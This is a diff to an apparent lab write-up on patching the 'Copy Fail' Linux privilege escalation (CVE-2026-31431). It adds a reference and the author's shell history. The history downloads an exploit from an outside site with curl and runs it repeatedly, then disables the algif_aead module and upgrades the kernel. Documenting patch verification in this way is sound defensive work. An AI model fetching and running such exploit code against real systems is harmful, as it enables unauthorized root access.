@@ -128,4 +128,53 @@ Then, after all is done, we will check our kernel version to verify the changes:
 ![alt text](imagen-6.png)
     here, we can see that the new kernel is in the version 6.12.88 (non-vulnerable), as opposed to the initial kernel version of 6.12.74 (vulnerable).
 
+
+References:
 Team, M. D. S. R. (2026, 2 mayo). CVE-2026-31431: Copy Fail vulnerability enables Linux root privilege escalation across cloud environments. Microsoft Security Blog. https://www.microsoft.com/en-us/security/blog/2026/05/01/cve-2026-31431-copy-fail-vulnerability-enables-linux-root-privilege-escalation/
+
+History of commands made:
+1  uname -a
+    2  curl https://copy.fail/exp > copy_fail_exp.py
+    3  cim copy_fail_exp.py
+    4  clear
+    5  uname -a
+    6  curl https://copy.fail/exp > copy_fail_exp.py
+    7  vim copy_fail_exp.py
+    8  id
+    9  whoami
+   10  python3 copy_fail_exp.py
+   11  whoami
+   12  id
+   13  echo "install algif_aead /bin/false" | sudo tee /etc/modprobe.d/disable-algif.conf
+   14  su -
+   15  echo "install algif_aead /bin/false" | sudo tee /etc/modprobe.d/disable-algif.conf
+   16  visudo
+   17  su -
+   18  sudo -l -U PaulaCevallos
+   19  python3 copy_fail_exp.py
+   20  ls mod | grep algif_eaead
+   21  clear
+   22  lsmod | grep algif_aead
+   23  rmmod algif_aead
+   24  sudo rmmod algif_aead
+   25  python3 copy_fail_exp.py
+   26  su -
+   27  lsmod | grep algif_aead
+   28  sudo rmmod algif_aead
+   29  lsmod | grep algif_aead
+   30  python3 copy_fail_exp.py
+   31  clear
+   32  echo "install algif_aead /bin/false" | sudo tee /etc/modprobe.d/disable-algif.conf
+   33  sudo rmmod algif_aead 2>/dev/null || true
+   34  grep -qE 'algif_aead ' /proc/modules && echo "Affected module is loaded" || echo "Affected module is NOT loaded"
+   35  python3 copy_fail_exp.py
+   36  cd kernel/linux/crypto
+   37  less algif_aead.c
+   38  sudo apt update && sudo apt upgrade -y
+   39  sudo reboot
+   40  uname -r
+   41  python3 coy_fail_exp.py
+   42  python3 copy_fail_exp.py
+   43  lsmod | grep algif_aead
+   44  echo "Ya està parchado de manera permanente"
+   45  history
